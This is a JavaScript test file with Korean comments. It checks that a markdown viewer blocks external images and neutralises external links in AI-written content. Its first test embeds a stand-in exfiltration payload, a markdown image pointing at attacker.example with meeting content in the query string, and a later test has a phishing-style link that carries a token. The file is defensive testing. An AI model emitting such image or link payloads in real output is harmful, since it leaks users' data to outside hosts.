import assert from "node:assert/strict";
import test from "node:test";
import { readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { runInNewContext } from "node:vm";
import ts from "typescript";
import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import * as classNames from "../src/shared/lib/classNames.ts";
import * as segments from "../src/shared/lib/markdownSegments.ts";
import * as closedMath from "../src/shared/lib/remarkClosedMath.ts";
import * as sourceBlocks from "../src/shared/lib/markdownSourceBlocks.ts";
import * as customTokens from "../src/shared/lib/remarkCustomTokens.ts";
import * as externalResources from "../src/shared/lib/externalResources.ts";

// 실제 MarkdownViewer와 ManagedImage를 함께 렌더해 외부 주소의 <img>·링크가 만들어지지 않는지 본다(이슈 #77).
const require = createRequire(import.meta.url);
function load(path, aliases) {
  const output = ts.transpileModule(readFileSync(new URL(path, import.meta.url), "utf8"), {
    compilerOptions: { target: ts.ScriptTarget.ES2022, module: ts.ModuleKind.CommonJS, jsx: ts.JsxEmit.ReactJSX, esModuleInterop: true }
  }).outputText;
  const exports = {};
  runInNewContext(output, { exports, require: (id) => aliases[id] ?? require(id) });
  return exports;
}

const assets = { acquireAssetObjectUrl: () => new Promise(() => {}), releaseAssetObjectUrl() {} };
const { ManagedImage } = load("../src/shared/ui/markdown/ManagedImage.tsx", {
  "@/shared/api/assets": assets,
  "@/shared/lib/externalResources": externalResources
});
const { MarkdownViewer } = load("../src/shared/ui/MarkdownViewer.tsx", {
  "@/shared/lib/remarkClosedMath": closedMath,
  "@/shared/lib/classNames": classNames,
  "@/shared/lib/markdownSegments": segments,
  "@/shared/lib/markdownSourceBlocks": sourceBlocks,
  "@/shared/lib/remarkCustomTokens": customTokens,
  "@/shared/lib/externalResources": externalResources,
  "@/shared/ui/markdown/ManagedImage": { ManagedImage }
});

const render = (markdown, props = {}) => renderToStaticMarkup(React.createElement(MarkdownViewer, { markdown, ...props }));
const imgSources = (html) => [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((match) => match[1]);

test("외부 이미지는 요청하지 않고 도메인만 알리는 자리 표시로 그린다", () => {
  const html = render([
    "![유출](https://attacker.example/p.png?q=회의%20내용)",
    "![](//cdn.example/a.png) ![](/\\evil.example/a.png)",
    "![ref][logo]\n\n[logo]: http://pixel.example/t.gif",
    "<img src=\"https://raw-html.example/x.png\">"
  ].join("\n\n"));

  assert.deepEqual(imgSources(html), []);
  assert.doesNotMatch(html, /attacker\.example\/p\.png|https?:\/\/|\/\/cdn/);
  assert.match(html, /외부 이미지는 표시하지 않습니다 · attacker\.example/);
  assert.match(html, /외부 이미지는 표시하지 않습니다 · cdn\.example/);
  // markdown은 `\`를 %5C로 인코딩하므로 `/\host`는 같은 출처 경로가 되어 역시 요청하지 않는다
  assert.match(html, /표시할 수 없는 이미지입니다/);
  assert.match(html, /외부 이미지는 표시하지 않습니다 · pixel\.example/);
  assert.doesNotMatch(html, /raw-html\.example/);
});

test("관리 경로가 아닌 같은 출처 이미지도 요청하지 않는다", () => {
  const html = render("![a](/logo.png) ![b](images/b.png)");
  assert.deepEqual(imgSources(html), []);
  assert.equal(html.match(/표시할 수 없는 이미지입니다/g)?.length, 2);
});

test("관리 이미지는 인증 fetch로 받은 뒤에 그리므로 서버 렌더링에서는 원본 경로를 넣지 않는다", () => {
  const html = render("![](/api/workspaces/ws/assets/a1/content)");
  assert.deepEqual(imgSources(html), []);
  assert.doesNotMatch(html, /표시하지 않습니다|표시할 수 없는/);
});

test("기본 정책은 외부 링크를 그대로 누를 수 있게 두되 Referer·opener를 넘기지 않는다", () => {
  const html = render("[외부](https://example.com/a) [내부](/workspaces/ws/documents/1) [목차](#h)");
  assert.match(html, /<a href="https:\/\/example\.com\/a" rel="noopener noreferrer">외부<\/a>/);
  assert.match(html, /<a href="\/workspaces\/ws\/documents\/1">내부<\/a>/);
  assert.match(html, /<a href="#h">목차<\/a>/);
});

test("AI 본문 정책은 외부 링크를 누를 수 없는 글자와 도메인으로 바꾸고 내부 링크는 둔다", () => {
  const html = render(
    "[로그인](https://phish.example/login?token=x) <https://auto.example/p> [메일](mailto:a@b.example) [내부](/workspaces/ws) [[위키 문서]]",
    { linkPolicy: "inert-external" }
  );
  assert.doesNotMatch(html, /href="(?:https?:|mailto:|\/\/)/);
  assert.doesNotMatch(html, /phish\.example\/login/);
  assert.equal(html.match(/<a /g)?.length, 1);
  assert.match(html, /<span class="markdown-inert-link">로그인 \(phish\.example\)<\/span>/);
  assert.match(html, /<span class="markdown-inert-link">https:\/\/auto\.example\/p \(auto\.example\)<\/span>/);
  assert.match(html, /<span class="markdown-inert-link">메일<\/span>/);
  assert.match(html, /<a href="\/workspaces\/ws">내부<\/a>/);
  assert.match(html, /markdown-wikilink/);
});
